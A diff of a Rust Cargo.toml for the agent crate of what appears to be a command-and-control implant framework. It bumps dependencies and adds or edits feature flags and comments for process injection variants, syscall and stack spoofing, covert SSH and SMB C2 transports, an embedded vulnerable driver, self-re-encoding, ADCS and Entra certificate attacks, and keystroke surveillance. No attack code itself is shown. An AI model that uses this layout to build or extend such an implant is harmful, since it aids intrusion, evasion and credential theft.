@@ -7,51 +7,48 @@ license.workspace = true
 
 [dependencies]
 chacha20 = "0.9"
-bincode = "1.3"
+bincode = { version = "2", features = ["serde"] }
 base32 = "0.4.0"
 sha2 = { workspace = true }
 subtle = { version = "2", default-features = false }
-hmac = "0.12"
+hmac = "0.13"
 hex = "0.4"
-reqwest = { version = "0.11", default-features = false, features = ["rustls-tls", "json"] }
+reqwest = { version = "0.12", default-features = false, features = ["rustls-tls", "json", "blocking"] }
 junk_macro = { path = "../junk_macro" }
 pe_resolve = { path = "../pe_resolve" }
 string_crypt = { path = "../string_crypt" }
 common = { path = "../common" }
 uefi-persistence = { path = "../uefi-persistence", optional = true }
-log = "0.4"
 tokio = { workspace = true }
 tracing = { workspace = true }
 tracing-subscriber = { workspace = true }
 sysinfo = { workspace = true }
 anyhow = { workspace = true }
+# portable-pty: cross-platform PTY interface used by the interactive shell.
+# NOTE: 0.9 is the latest release.  If maintenance stalls, consider migrating
+# to `xpty` (async fork of portable-pty) or `wezterm-pty`.  The API surface
+# used is: NativePtySystem, CommandBuilder, PtySize, ChildKiller, MasterRead.
 portable-pty = "0.9"
 dirs = "5.0"
-lazy_static = "1.4"
 uuid = { version = "1.0", features = ["v4"] }
 base64 = { workspace = true }
 urlencoding = { workspace = true }
-serde_json = "1.0"
+serde_json = { workspace = true }
 serde = { workspace = true }
 module_loader = { path = "../module_loader" }
 optimizer = { path = "../optimizer" }
 code_transform = { path = "../code_transform", optional = true }
-goblin = { version = "0.7", default-features = false, features = ["elf64", "elf32", "endian_fd"], optional = true }
-toml = "1.1.2"
-directories = "6.0.0"
-# rustls 0.23 is used by the agent's direct TLS (outbound, SSH transport, etc.)
-rustls = { version = "0.23.38", default-features = false, features = ["ring", "std", "logging", "tls12"] }
-# rustls 0.21 is the version reqwest 0.11 depends on; needed to build a custom
-# ServerCertVerifier for certificate pinning that is compatible with reqwest's
-# use_preconfigured_tls() API.
-rustls_0_21 = { package = "rustls", version = "0.21", default-features = false, features = ["dangerous_configuration"] }
-tokio-rustls = { version = "0.26.4", default-features = false, features = ["ring", "logging", "tls12"] }
+goblin = { version = "0.8", default-features = false, features = ["elf64", "elf32", "endian_fd"], optional = true }
+toml = { workspace = true }
+# rustls 0.23 is used for TLS (outbound, SSH transport, reqwest 0.12, etc.)
+rustls = { workspace = true }
+tokio-rustls = { workspace = true }
 rustls-pemfile = "2.2.0"
 rustls-native-certs = "0.8"
 rcgen = { version = "0.14.7", default-features = false, features = ["crypto", "ring", "pem"] }
-sha1 = "0.10"
+sha1 = "0.11"
 md-5 = "0.10"
-digest = "0.10"
+digest = "0.11"
 getrandom = "0.2"
 rand = "0.8"
 url = "2"
@@ -61,7 +58,7 @@ once_cell = "1.21.4"
 zeroize = { version = "1.8.2", features = ["zeroize_derive"] }
 chacha20poly1305 = "0.10"
 x25519-dalek = { version = "2", features = ["static_secrets"] }
-hkdf = { version = "0.12" }
+hkdf = { version = "0.13" }
 ed25519-dalek = { version = "2", features = ["rand_core"] }
 # RSA key handling + RS256 JWT signing for Entra ID Pass-the-Certificate.
 # ring is already pulled in transitively by rustls and rcgen; listing it as a
@@ -70,45 +67,68 @@ ed25519-dalek = { version = "2", features = ["rand_core"] }
 ring = { version = "0.17", optional = true }
 aes-gcm = "0.10"
 aes = "0.9.0"
-ctr = "0.10.0"
 async-trait = "0.1.89"
-# winapi type-only dependency: provides HANDLE, DWORD, IMAGE_*_HEADER etc.
-# All `use winapi::` imports in cross-platform modules (syscalls, env_check,
-# process_manager) are inside `#[cfg(windows)]` function bodies, so this dep
-# compiles but is never linked on non-Windows targets.  The Windows-specific
-# API features (OpenProcess, VirtualAlloc, etc.) live in the target-gated
-# `[target.'cfg(windows)'.dependencies]` entry below.
-#
-# Future optimisation: move this to `cfg(windows)` once every module-level
-# `use winapi::` import is behind a cfg gate (currently cet_bypass.rs has
-# ungated module-level imports, but that module itself is cfg-gated, so it
-# is safe).  Risk is low, benefit is marginal (type-only, no linking).
-winapi = { version = "0.3", features = ["ntdef", "psapi", "threadpoolapiset", "threadpoollegacyapiset", "memoryapi", "winnt", "ntsecapi", "sspi"] }
-russh = { version = "0.46", optional = true }
-russh-keys = { version = "0.46", optional = true }
+# windows-sys: Microsoft's official Win32 API bindings (replaces unmaintained winapi).
+# Compiles on all platforms — generates empty stubs on non-Windows.
+# All `use windows_sys::` imports in cross-platform modules are inside
+# `#[cfg(windows)]` blocks, so no FFI linking occurs on non-Windows targets.
+windows-sys = { version = "0.59", features = [
+    "Win32_Foundation",
+    "Win32_Graphics_Gdi",
+    "Win32_NetworkManagement_WNet",
+    "Win32_Security",
+    "Win32_Security_Cryptography",
+    "Win32_System_Com",
+    "Win32_System_Variant",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Kernel",
+    "Win32_System_Memory",
+    "Win32_System_Registry",
+    "Win32_System_Rpc",
+    "Win32_System_SystemInformation",
+    "Win32_System_SystemServices",
+    "Win32_System_Threading",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_LibraryLoader",
+    "Win32_System_Pipes",
+    "Win32_System_ProcessStatus",
+    "Win32_System_Wmi",
+    "Win32_UI_WindowsAndMessaging",
+    "Win32_Security_Authentication_Identity",
+    "Win32_Storage_FileSystem",
+    "Win32_System_WindowsProgramming",
+] }
+# SSH transport via russh.  0.60.2 is the latest stable release but depends on
+# pre-release RustCrypto crates (aead 0.6.0-rc, aes-gcm 0.11.0-rc,
+# curve25519-dalek 5.0.0-pre, ed25519-dalek 3.0.0-pre, pkcs8 0.11.0-rc,
+# spki 0.8.0-rc, and stable-but-duplicate sha2/hkdf/hmac/pbkdf2 0.13).
+# This creates ~16 duplicate crate versions in Cargo.lock, gated behind the
+# `ssh-transport` feature.  Cannot be patched away — russh requires the newer
+# API surface.  Revisit when russh releases a version built on stable RustCrypto.
+russh = { version = "0.60.2", optional = true, default-features = false, features = ["flate2", "ring"] }
 quinn = { version = "0.11", optional = true }
 notify = { version = "6.1", optional = true }
 
 [target.'cfg(target_os = "linux")'.dependencies]
 enigo = { version = "0.2", optional = true, default-features = false, features = ["x11rb"] }
-image = { version = "0.25", optional = true }
+image = { version = "0.25", optional = true, default-features = false, features = ["png"] }
 x11rb = { version = "0.13", optional = true, features = ["image"] }
 zbus = { version = "4", optional = true, default-features = false, features = ["tokio"] }
 futures-util = { version = "0.3", optional = true, default-features = false }
 
 [target.'cfg(target_os = "macos")'.dependencies]
 enigo = { version = "0.2", optional = true }
-image = { version = "0.25", optional = true }
+image = { version = "0.25", optional = true, default-features = false, features = ["png"] }
 
 [target.'cfg(windows)'.dependencies]
 enigo = { version = "0.2", optional = true }
 winreg = "0.52"
-image = { version = "0.25", optional = true }
-winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "winnetwk", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "objidlbase", "wtypesbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr", "dpapi", "wincrypt", "errhandlingapi", "namedpipeapi", "wbemcli"] }
+image = { version = "0.25", optional = true, default-features = false, features = ["png"] }
 hollowing = { path = "../hollowing" }
 nt_syscall = { path = "../nt_syscall" }
 
 [features]
+default = ["manual-map"]
 p2p-tcp = []
 ppid-spoofing = []
 stealth = ["direct-syscalls", "unsafe-runtime-rewrite", "memory-guard", "ppid-spoofing"]
@@ -123,6 +143,11 @@ network-discovery = []
 # or an X11 sysroot.
 remote-assist = ["dep:enigo", "dep:image", "dep:x11rb", "dep:zbus", "dep:futures-util"]
 module-signatures = ["common/module-signatures"]
+# Strict runtime key policy for module verification: when enabled alongside
+# module-signatures, the module loader hard-errors at runtime if no explicit
+# verification key is provided (instead of falling back to the compile-time
+# MODULE_SIGNING_PUBKEY constant).  Passthrough to module_loader.
+strict-module-key = ["module_loader/strict-module-key", "module-signatures"]
 direct-syscalls = []
 # Pre-injection ETW auto-logger enumeration via registry (NtOpenKey /
 # NtEnumerateKey / NtQueryValueKey).  When disabled, check_etw_trace()
@@ -137,7 +162,19 @@ etw-check = []
 stack-spoof = ["direct-syscalls"]
 manual-map = ["module_loader/manual-map"]
 traffic-normalization = []
-perf-optimize = []
+perf-optimize = ["optimizer/diversification"]
+# Injection technique features.
+# These gate individual injection techniques at compile time via #[cfg(feature)].
+# When disabled, the technique's enum variant, dispatch path, implementation
+# functions, and all sub-variants are excluded from the binary, reducing code
+# surface.  Requires (and implies) `direct-syscalls` for indirect syscall stubs.
+module-stomp = ["direct-syscalls"]
+thread-hijack = ["direct-syscalls"]
+threadpool-inject = ["direct-syscalls"]
+fiber-inject = ["direct-syscalls"]
+context-only = ["direct-syscalls"]
+section-map = ["direct-syscalls"]
+callback-inject = ["direct-syscalls"]
 # Capture human-computer-interaction telemetry (key/mouse events, timing).
 # On Linux this uses rdev's default X11/libinput backend.  Compile with the
 # companion `evdev` feature to switch to the kernel evdev-rs backend instead;
@@ -151,10 +188,10 @@ hci-research = ["dep:chrono", "dep:twox-hash"]
 # env vars (set automatically by the Builder when outbound-c is included in a
 # profile). Debug builds may override them with ORCHESTRA_C / ORCHESTRA_SECRET.
 outbound-c = []
-# Application-layer perfect forward secrecy via X25519 ECDH + HKDF.
-# When enabled, each session derives a unique AES-256-GCM key from an
-# ephemeral DH exchange authenticated by the PSK.
-forward-secrecy = ["common/forward-secrecy"]
+# NOTE: Application-layer forward secrecy (X25519 ECDH + HKDF) is now
+# always enabled.  The `common::forward_secrecy` module is compiled
+# unconditionally and available in all builds.  The old feature flag has
+# been removed because it was a no-op stub that gated nothing.
 unsafe-runtime-rewrite = ["optimizer/unsafe-runtime-rewrite"]
 # Encrypt all designated sensitive memory regions while the agent is idle.
 # Uses XChaCha20-Poly1305.  The 32-byte key is held in CPU registers (x86-64
@@ -188,7 +225,7 @@ surveillance = ["dep:image"]# Activate the SSH covert transport (c2_ssh::SshTran
 # traffic through an SSH session channel.  Add russh and russh-keys to the
 # dependency set; requires no native OpenSSL library — all crypto is
 # pure-Rust.
-ssh-transport = ["dep:russh", "dep:russh-keys"]
+ssh-transport = ["dep:russh"]
 # Activate the SMB/TCP named-pipe covert transport (c2_smb::SmbPipeTransport).
 # When enabled and smb_pipe_enabled=true is set in agent.toml, the agent
 # tunnels C2 traffic through a Windows named pipe.  Two modes are supported:
@@ -258,12 +295,13 @@ thread-ctx-encrypt = []
 # logic.  Requires (and implies) `direct-syscalls`.  Windows-only.
 kernel-callback = ["direct-syscalls"]
 # Embed XOR-encrypted vulnerable driver bytes at compile time.  When enabled,
-# the ORCHESTRA_DRIVER_PATH environment variable MUST be set to the path of the
-# encrypted driver file.  If not set, compilation fails with a clear error.
+# the ORCHESTRA_DRIVER_PATH (or SYS_DRIVER_PATH) environment variable MUST be
+# set to the path of the encrypted driver file.  If not set, compilation fails
+# with a clear error.  Set EMBEDDED_DRIVER_ALLOW_MISSING=1 or CI=1 to compile
+# a no-op stub instead (for `--all-features` CI builds).
 # Example:
 #   ORCHESTRA_DRIVER_PATH=resources/drivers/dbutil_2_3_xor_encrypted.bin \
 #       cargo build --features embedded_driver
-# When disabled (default), a minimal placeholder driver stub is included instead.
 embedded_driver = []
 # Self-re-encoding ("Metamorphic Lite"): periodically re-encode the agent's own
 # .text section at runtime using the code_transform pipeline with a fresh seed
@@ -613,7 +651,7 @@ entra-app-abuse = ["entra-ptc"]
 # Certificate-based attacks survive password resets.  Requires a domain-
 # joined Windows environment.  Windows-only via `#[cfg(windows)]` in the
 # module.  No new crate dependencies beyond what is already in the tree.
-adcs-attacks = []
+adcs-attacks = ["dep:ring"]
 
 # macOS post-exploitation: TCC bypass (database manipulation, synthetic click,
 # vulnerable process delegation), SIP status assessment and capability
@@ -646,6 +684,11 @@ optional = true
 criterion = "0.8.2"
 rcgen = "0.14.7"
 tempfile = "3.27.0"
+
+[build-dependencies]
+base64 = { workspace = true }
+getrandom = "0.2"
+serde_json = "1.0"
 
 [[bench]]
 name = "agent_benchmark"
